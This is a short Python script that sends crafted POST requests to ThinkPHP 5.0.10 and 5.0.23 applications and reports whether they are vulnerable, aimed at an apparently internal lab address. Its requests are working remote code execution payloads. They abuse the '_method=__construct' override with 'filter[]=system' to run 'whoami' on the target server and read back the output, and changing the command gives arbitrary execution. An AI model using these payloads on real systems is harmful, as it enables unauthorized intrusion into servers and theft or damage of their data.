import urllib3
import re



def check5010(url):
    http = urllib3.PoolManager()
    r = http.request("POST",url+"/public/index.php?s=index/index/index/",fields={"s":"whoami","filter[]":"system","_method":"__construct","method":""})
    result = re.search(r"(?<=\"echo\">).*?(?=</div>)",str(r.data),re.S)
    user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
    if user:
        print(url,"Vulnerable",user)
    else:
        print(url,"Not Vulnerable")

def check5023(url):
    http = urllib3.PoolManager()
    r = http.request("POST",url+"/public/index.php?s=captcha",fields={"server[REQUEST_METHOD]":"whoami","filter[]":"system","_method":"__construct","method":"get"})
    result = re.search(r"(?<=\"echo\">).*?(?=</div>)",str(r.data),re.S)
    user = result.group(0).replace(" ","").strip("\r\n\\r\\n")
    if user:
        print(url,"Vulnerable",user)
    else:
        print(url,"Not Vulnerable")

if __name__ == "__main__":
    urls = ["http://10.67.9.24/tp5010/"]
    for url in urls:
        try:
            check5010(url)
            check5023(url)
        except Exception as e:
            print(e)
